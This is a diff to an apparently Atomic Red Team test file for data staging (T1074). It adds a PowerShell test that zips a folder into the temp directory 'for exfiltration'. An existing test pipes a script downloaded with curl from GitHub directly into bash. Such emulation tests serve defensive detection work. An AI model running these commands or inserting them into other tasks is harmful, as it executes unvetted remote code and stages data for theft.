@@ -28,3 +28,16 @@ atomic_tests:
     name: bash
     command: |
       curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh | bash -s > /tmp/discovery.log
+
+- name: Zip a Folder with PowerShell
+  description: |
+    use living off the land tools to encrypt and zip a file for exfiltration
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+    cleanup_command: |
+      Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
